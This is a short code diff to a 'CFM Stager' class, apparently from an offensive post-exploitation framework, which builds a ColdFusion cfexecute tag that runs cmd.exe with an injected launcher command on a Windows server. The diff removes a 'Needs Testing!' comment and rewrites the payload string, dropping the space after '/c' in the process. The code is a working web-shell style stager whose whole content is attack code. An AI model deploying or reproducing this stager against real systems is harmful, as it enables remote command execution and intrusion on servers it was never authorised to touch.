@@ -1,5 +1,4 @@
 #CFM Stager
-#Needs Testing!
 from lib.common import helpers
 
 class Stager:
@@ -86,8 +85,9 @@ class Stager:
             return ""
 	else:
 			code = '''<cfexecute name = "C:\Windows\system32\cmd.exe"
-   				arguments = "/c launcher"
-   				timeout = "10">
-				</cfexecute>
-				'''
-        return code.replace("launcher", launcher)
+arguments = "/c''' + str(launcher) + '''"
+timeout = "10">
+</cfexecute>
+'''
+
+        return code
